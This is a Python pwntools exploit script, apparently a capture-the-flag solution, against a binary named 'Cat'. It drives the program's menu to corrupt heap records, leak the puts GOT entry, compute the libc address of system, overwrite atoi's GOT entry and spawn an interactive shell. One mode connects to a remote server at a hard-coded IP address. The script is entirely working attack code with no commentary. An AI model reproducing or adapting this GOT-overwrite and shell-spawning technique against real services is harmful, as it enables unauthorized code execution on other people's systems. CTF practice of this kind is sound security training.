from pwn import *

def create(p, name, kind, age=0):
    p.recvuntil(">")
    p.sendline("1")
    p.recvuntil(">")
    p.sendline(name)
    p.recvuntil(">")
    p.sendline(kind)
    p.recvuntil(">")
    p.sendline(str(age))

def edit(p, i, name, kind, age=0, modify='y'):
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil(">")
    p.sendline(str(i))
    p.recvuntil(">")
    p.sendline(name)
    p.recvuntil(">")
    p.sendline(kind)
    p.recvuntil(">")
    p.sendline(str(age))
    p.recvuntil(">")
    p.sendline(modify)

def print_all(p):
    p.recvuntil(">")
    p.sendline("4")
    print(p.recvuntil("----------------------\n"))

def delete(p, i):
    p.recvuntil(">")
    p.sendline("5")
    p.recvuntil(">")
    p.sendline(str(i))

def print_record(p, i):
    p.recvuntil(">")
    p.sendline("3")
    p.sendline(str(i))
    p.recvuntil("old: ")
    return int(p.recvuntil("\n")[:-1])

import sys

if __name__ == '__main__':
#    context.log_level = 'debug'
    if int(sys.argv[1]) == 1:
        PUTS_OFF = 0x6f130
        SYSTEM_OFF = 0x41fa0
        p = process("./Cat")
        # gdb.attach(p)

    elif int(sys.argv[1] == 2):
        p = process("/home/tosh/bin/rop-tool heap ./Cat".split(" "), stderr=2)
    else:
        SYSTEM_OFF = 0x0000000000045390
        PUTS_OFF = 0x000000000006f690
        p = remote('178.62.40.102', 6000)

    # Leak puts@got
    create(p, "A"*15, "A"*15)
    create(p, "B"*15, "B"*15)
    create(p, "C"*15, "C"*15)
    create(p, "C"*15, "C"*15)
    create(p, "C"*15, "C"*15)
    edit(p, 2, "A"*16, "A"*16, age=5, modify='n')
    create(p, "C"*15, p64(0x6020A0 + 7*8))
    delete(p, 0)
    delete(p, 1)
    edit(p, 2, p64(0x602028 - 16), "E"*16, modify='y')
    puts = print_record(p, 7)
    print "puts = %x" % puts

    # overwrite atoi@got by system
    edit(p, 4, "A"*16, "A"*16, age=5, modify='n')
    create(p, "C"*15, p64(0x602068))
    system = puts - PUTS_OFF + SYSTEM_OFF
    edit(p, 4, p64(system), "E"*16, modify='y')

    p.sendline("sh")
    p.clean(1)
    p.interactive()
